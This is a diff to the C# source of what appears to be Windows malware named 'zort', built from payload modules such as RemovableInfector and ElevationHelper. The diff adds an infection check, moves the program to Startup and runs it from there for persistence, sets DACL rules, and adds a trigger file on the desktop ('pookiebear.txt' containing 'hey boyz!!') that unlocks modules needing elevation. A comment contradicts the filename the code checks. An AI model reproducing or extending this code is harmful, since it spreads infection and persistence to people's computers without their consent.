@@ -1,13 +1,13 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
 using System.ServiceProcess;
-using System.Threading.Tasks;
 
 namespace zort
 {
     class Program : ServiceBase
     {
-        List<IPayloadModule> modules = new List<IPayloadModule>
+        readonly List<IPayloadModule> modules = new List<IPayloadModule>
                 {
                     new RemovableInfector(),
                     new ElevationHelper(),
@@ -33,7 +33,7 @@ namespace zort
                     {
                         service.OnStart(args);
                         //Console.WriteLine("Press any key to stop the service...");
-                        while(true)
+                        while (true)
                         {
                             Console.ReadLine();
                         }
@@ -49,6 +49,8 @@ namespace zort
             {
                 var program = new Program();
                 RemovableInfector.CheckIfRunningFromRemovableDrive();
+                if (!RemovableInfector.IsSystemInfected()) PersistenceHelper.MoveAndRunFromStartup();
+                else Environment.Exit(0);
                 program.InitModules();
                 //Console.WriteLine("Press any key to exit...");
                 while (true)
@@ -62,8 +64,10 @@ namespace zort
         {
             try
             {
+                Console.WriteLine("Setting DACL rules.");
                 RemovableInfector.CheckIfRunningFromRemovableDrive();
                 InitModules();
+                PersistenceHelper.SetDACL();
             }
             catch (Exception ex)
             {
@@ -90,29 +94,58 @@ namespace zort
         private void InitModules()
         {
             bool isAdmin = ElevationHelper.IsElevated();
-            modules.ForEach(m =>
-            {
-                switch(m.ElevationType)
-                {
-                    case ElevationType.Elevated:
-                        if (!isAdmin)
-                        {
-                            Console.WriteLine($"Skipping module {m.ModuleName}, it requires admin privileges.");
-                            return;
-                        }
-                        break;
-                    case ElevationType.NonElevated:
-                        if (isAdmin)
-                        {
-                            Console.WriteLine($"Skipping module {m.ModuleName}, it does not need to work unelevated.");
-                            return;
-                        }
-                        break;
-                }
 
-                Console.WriteLine($"Starting module {m.ModuleName}");
-                m.Start();
-            });
+            // Check if legally elevated
+            if (isAdmin)
+            {
+                if (File.Exists(ElevationHelper.GetElevationFilePath()))
+                {
+                    Console.WriteLine("Elevation file exists, indicating a legal elevation. continue action");
+                    File.Delete(ElevationHelper.GetElevationFilePath());
+                }
+                else
+                {
+                    isAdmin = false;
+
+                    Console.WriteLine("Elevation file does not exist, indicating an illegal elevation. Checking for a file on the desktop...");
+
+                    // Check if there is a file called asdfmovie.txt in desktop
+                    string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+                    string filePath = Path.Combine(desktopPath, "pookiebear.txt");
+                    if (!File.Exists(filePath)) goto modules;
+                    //Validate the file contents. it should contain "hey boyz!!"
+                    string fileContents = File.ReadAllText(filePath);
+                    if (!fileContents.Contains("hey boyz!!")) goto modules;
+                    Console.WriteLine("File contents are valid. authorized exec.");
+                    isAdmin = true;
+                }
+            }
+
+            modules:
+
+                modules.ForEach(m =>
+                {
+                    switch (m.ElevationType)
+                    {
+                        case ElevationType.Elevated:
+                            if (!isAdmin)
+                            {
+                                Console.WriteLine($"Skipping module {m.ModuleName}, it requires admin privileges.");
+                                return;
+                            }
+                            break;
+                        case ElevationType.NonElevated:
+                            if (isAdmin)
+                            {
+                                Console.WriteLine($"Skipping module {m.ModuleName}, it does not need to work unelevated.");
+                                return;
+                            }
+                            break;
+                    }
+
+                    Console.WriteLine($"Starting module {m.ModuleName}");
+                    m.Start();
+                });
+            }
         }
     }
-}
